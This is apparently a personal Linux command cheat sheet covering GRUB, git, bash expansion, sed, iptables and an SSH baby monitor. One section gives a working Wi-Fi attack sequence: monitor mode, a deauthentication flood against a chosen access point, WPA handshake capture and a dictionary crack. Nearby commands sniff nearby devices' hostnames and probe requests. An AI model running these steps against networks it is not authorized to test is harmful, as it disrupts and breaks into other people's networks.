system shuts down during lid close suspend:
Edit the file /etc/default/grub 
Change the line with:
GRUB_CMDLINE_LINUX=""
to GRUB_CMDLINE_LINUX="acpi_sleep=nonvs"
run update-grub

# from command line
systemctl suspend

***********

git

git init

# to set the editor
git config --global core.editor "vim"

git commit

git status

git log

git rm [file names]

source ~/.git-completion.bash
source ~/.git-prompt.sh

https://github.com/git/git/tree/master/contrib/completion


***********************

ssh pi@raspberrypi.home 'arecord -f cd -D plughw:1 | ffmpeg -ac 1 -i - -f ogg -' | mplayer - -idle -demuxer ogg # Baby monitor over ssh, making it more private/secure than those in stores. Replace plughw:1 with mic device from arecord -l output. Make it a script for easy access.
 

************************
airmon-ng
airmon-ng start [interface name]
airodump-ng wlan0mon
airodump-ng wlan0mon -c 6 # only channel 6
airodump-ng wlan0mon -c 6 --bssid aa:aa:aa:aa:ff:33 # only this ap on this channel
airodump-ng wlan0mon -c 6 --bssid aa:aa:aa:aa:ff:33 -w capture-file
aireplay-ng --deauth 100 -a [ap mac] wlan0mon
aircrack-ng -w words [cap file]

aircrack-ng will list out the APs in the cap file and, if wpa, will list num of handsakes; need 1
pipe it through tee [file] and select some random ap to capture text list of aps, then:
grep handshake foo1 | grep -v "0 handshake"

to find if there are any to crack

##############################

create qr code from text in clipboard on cmd line!!!

xclip -out -selection clipboard | qrencode -o - -t UTF8

##############################

cat /etc/passwd |toilet|lolcat

toilet asciifies bigly
lolcat colorizes ascii

##############################


service NetworkManager stop
ifconfig wlp1s0 down
iwconfig wlp1s0 mode monitor
ifconfig wlp1s0 up


iwconfig wlp1s0 mode managed
service NetworkManager restart


sudo tcpdump -i wlp1s0 -w filename not ether host b8:08:cf:32:be:6c

tshark -ni wlp1s0 -Y "bootp.option.type==53" -T fields -e bootp.option.hostname -e eth.src_resolved

wlan.fc.type_subtype == 0x0004
# to get SSID probe requests
##############################

Assignment
Assign value to variable if variable is not already set. Value will be returned.

Couple with : no-op if return value is to be discarded.	${variable="value"}
: ${variable="value"}

Removal

Delete shortest match of needle from front of haystack	${haystack#needle}
Delete longest match of needle from front of haystack	${haystack##needle}
Delete shortest match of needle from back of haystack	${haystack%needle}
Delete longest match of needle from back of haystack	${haystack%%needle}

Replacement

Replace first match of needle with replacement from haystack	${haystack/needle/replacement}
Replace all matches of needle with replacement from haystack	${haystack//needle/replacement}
If needle matches front of haystack replace with replacement	${haystack/#needle/replacement}
If needle matches back of haystack replace with replacement	${haystack/%needle/replacement}

Substitution

If variable not set, return value, else variable	${variable-value}
If variable not set or empty, return value, else variable	${variable:-value}
If variable set, return value, else null string	${variable+value}
If variable set and not empty, return value, else null string	${variable:+value}

Extraction

Extract length characters from variable starting at position	${variable:position:length}
String length of variable	${#variable}

##############################

display a set of lines from a file:
Assuming you need lines 20 to 40,

sed -n '20,40p;41q' file_name

or, for multiple sections, something like:
sed -n '5,8p;20,25p;26q' README.md

##############################

iptables

iptables -F -t raw
iptables -F -t mangle
iptables -F -t nat
iptables -F -t filter
iptables -F -t security

iptables -X -t table  # to delete all the user defined chains for the table; need to flush rules first

iptables -P INPUT ACCEPT|DROP    # set default
iptables -P FORWARD ACCEPT|DROP
iptables -P OUTPUT ACCEPT|DROP

clear and dump everything:
for t in raw mangle nat filter security; do iptables -F -t $t; iptables -X -t $t  ; echo -e "\n************* $t ************\n";iptables -L -t $t; done

---logging
       Kernel constant   Level value   Meaning
       KERN_EMERG             0        System is unusable
       KERN_ALERT             1        Action must be taken immediately
       KERN_CRIT              2        Critical conditions
       KERN_ERR               3        Error conditions
       KERN_WARNING           4        Warning conditions
       KERN_NOTICE            5        Normal but significant condition
       KERN_INFO              6        Informational
       KERN_DEBUG             7        Debug-level messages


